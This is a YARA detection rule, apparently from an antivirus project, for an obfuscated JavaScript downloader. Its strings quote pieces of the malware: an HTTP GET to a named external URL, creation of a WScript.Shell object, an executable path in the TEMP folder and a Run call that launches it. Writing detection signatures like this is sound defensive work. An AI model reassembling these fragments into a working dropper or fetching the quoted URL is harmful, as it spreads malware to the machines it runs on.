rule sig_20160330_5a7ab40cca3f69fc71300b6ab962c314 {
  meta:
    description = "datamaliciousorder - file 20160330_5a7ab40cca3f69fc71300b6ab962c314.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "65c983697cb9e29f9d9fd78fa5380beef1151a94a828f2122d71e2859a30186d"

  strings:
    $s1  = "_VG[_ZH](\"GET\", \"http://hollandfoodexchange.com/d7jsa\", false);" fullword ascii
    $s2  = "function _TP(_C, _KY){_F = _F * 1; return _C - _KY;};" fullword ascii
    $s3  = "var _BL = function _JM() {return WScript[_I0](\"WScript\"+\".Shell\");}(), _NH = 11;" fullword ascii
    $s4  = "if (_VG[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _K() {return _BL[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"CbL9mNeSivFbFP.ex\" + \"e\";};" fullword ascii
    $s6  = "function _CR(){return _P + \"\";};" fullword ascii
    $s7  = "function _TF() {return ((_MN == true) && (_MN == _W1)) ? 1 : _F;};" fullword ascii
    $s8  = "function _KS(_W0){_BL[\"Run\"](_W0, _F, _F);};" fullword ascii
    $s9  = "var _V = new this[\"Date\"]();" fullword ascii
    $s10 = "function _Z()" fullword ascii
    $s11 = "function _KE(){return 22;};" fullword ascii
    $s12 = "return _TP(_G, _BO);" fullword ascii
    $s13 = "function _L(){return _I0;};" fullword ascii
    $s14 = "function _I(_U) {var _N = (1, 2, 3, 4, 5, _U); return _N;};" fullword ascii
    $s15 = " while (_BK){" fullword ascii
    $s16 = "var _Z0 = false;" fullword ascii
    $s17 = "var _MN = false;" fullword ascii
    $s18 = "_MN = true; " fullword ascii
    $s19 = "_W1 = true; " fullword ascii
    $s20 = "var _W1 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}